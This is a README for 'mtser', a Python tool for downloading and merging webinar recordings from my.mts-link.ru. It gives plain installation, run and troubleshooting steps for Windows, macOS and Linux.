# 📥 mtser - Download and Save Webinar Videos Easily

[![Download mtser](https://img.shields.io/badge/Download-mtser-blue?style=for-the-badge&logo=python&logoColor=white)](https://github.com/CJ7X/mtser/releases)

---

## 📖 What is mtser?

mtser is a simple tool that helps you save webinar videos from the my.mts-link.ru website. This app downloads and combines webinar recordings into one video file. It runs on your computer using Python but doesn’t require any coding skills to use.

If you want to keep important webinars or watch recordings offline, mtser makes it easy. Just a few clicks, and your videos are ready to watch anytime.

---

## 💡 Key Features

- Download full webinar recordings from my.mts-link.ru
- Combine multiple video parts into one file automatically
- Save videos in common formats that work on most devices
- Simple to use without any programming knowledge
- Works on Windows, Mac, and Linux computers
- Lightweight and fast, so you don’t wait long for downloads

---

## 🖥️ System Requirements

To run mtser on your computer, you need:

- Operating System: Windows 10 or higher, macOS 10.13+, or recent Linux distribution
- Python version: Python 3.7 or newer installed on your computer
- Internet connection to download webinar videos
- Enough free disk space (usually a few gigabytes, depending on video length)
- Basic ability to download files and run programs

If you don’t have Python installed, we will guide you through the installation in the next section.

---

## 🚀 Getting Started

Follow these steps to get mtser running on your computer:

1. **Download mtser**

   Click the large green button above or visit the [mtser Releases page](https://github.com/CJ7X/mtser/releases) to get the latest version. The page shows all available downloads.

2. **Install Python (if needed)**

   mtser requires Python 3.7 or newer. To check if you have Python installed:

   - On Windows, open Command Prompt and type `python --version`
   - On macOS or Linux, open Terminal and type `python3 --version`

   If you see a version lower than 3.7, or a message that says Python is not found, follow these steps:

   - Go to [python.org/downloads](https://www.python.org/downloads/)
   - Download and install the latest Python version for your system
   - During installation on Windows, be sure to check the box labeled “Add Python to PATH”

3. **Open mtser folder**

   Once downloaded, extract the mtser files if they come in a zip archive. Then open the folder where mtser is saved.

---

## 📥 Download & Install mtser

1. Visit the [mtser Releases page on GitHub](https://github.com/CJ7X/mtser/releases).

2. Choose the latest release version. It is usually at the top of the list.

3. Download the `.zip` file or pre-built installer for your system if available. If there is no installer, the zip file contains all the needed code.

4. Extract the zip file to a new folder on your desktop or another location you prefer.

---

## ▶️ How to Run mtser

After downloading and installing Python and mtser files, follow these steps to download webinar videos:

### Windows

1. Open the folder where you saved mtser.

2. Hold Shift and right-click inside the folder. Choose “Open PowerShell window here” or “Open Command Prompt here”.

3. Type `python mtser.py` and press Enter.

4. The app will open in the command prompt window, asking for the webinar link.

5. Paste the full URL of the webinar page you want to download.

6. Follow the on-screen instructions. mtser will download and combine the video parts.

7. When finished, find the saved video file in the mtser folder.

---

### macOS and Linux

1. Open Terminal.

2. Navigate to the mtser folder. For example, if it is on your desktop:

   ```
   cd ~/Desktop/mtser
   ```

3. Type the command to start mtser:

   ```
   python3 mtser.py
   ```

4. Paste the webinar URL when asked.

5. Wait while mtser downloads and merges parts.

6. Locate your completed video inside the mtser folder.

---

## 🛠️ Configuration Options

mtser is made to work out of the box, but you can adjust settings if needed:

- **Download Folder:** By default, videos save in the mtser folder. You can change this inside the `settings.json` file.

- **Video Quality:** mtser will usually download the best available quality. You can change this in settings if problems occur.

- **Logging:** The app keeps a log of activities in a `.log` file. This helps diagnose issues.

You don’t need to change these unless you have a special situation.

---

## 🔧 Troubleshooting Tips

- If mtser does not start, check Python is installed and in your system path.

- Make sure your internet connection works. mtser requires access to my.mts-link.ru.

- If you get errors about missing Python packages, run:

  ```
  pip install -r requirements.txt
  ```

  inside the mtser folder.

- If videos do not download, verify the webinar URL is correct and publicly accessible.

- Restart the app and try again if you get unexpected crashes.

---

## 🎯 How mtser Works

mtser connects to the webinar site and downloads each recorded video segment. It then uses built-in Python tools to stitch these segments into one playable video. This process runs automatically after you provide the webinar URL.

This lets you easily save long webinars without handling many individual files.

---

## 📂 File Structure

After extraction, your mtser folder will include:

- `mtser.py` — the main program file you run
- `README.md` — this documentation
- `requirements.txt` — needed Python libraries
- `settings.json` — optional configuration file
- Other Python script files supporting functionality

---

## 👥 Support & Contribution

If you need help or want to report issues:

- Check the GitHub [Issues page](https://github.com/CJ7X/mtser/issues) for known problems.

- You can open a new issue to ask questions or report bugs.

- Contributions like bug fixes, new features, or documentation updates are welcome through pull requests.

---

## 🔗 Useful Links

- mtser Download page: [https://github.com/CJ7X/mtser/releases](https://github.com/CJ7X/mtser/releases)

- Python official site: [https://www.python.org/](https://www.python.org/)

- my.mts-link.ru (webinar site): [https://my.mts-link.ru/](https://my.mts-link.ru/)

---

## 📑 License

mtser is open source software licensed under the MIT License. You can use, modify, and share it freely.

---

[![Download mtser](https://img.shields.io/badge/Download-mtser-blue?style=for-the-badge&logo=python&logoColor=white)](https://github.com/CJ7X/mtser/releases)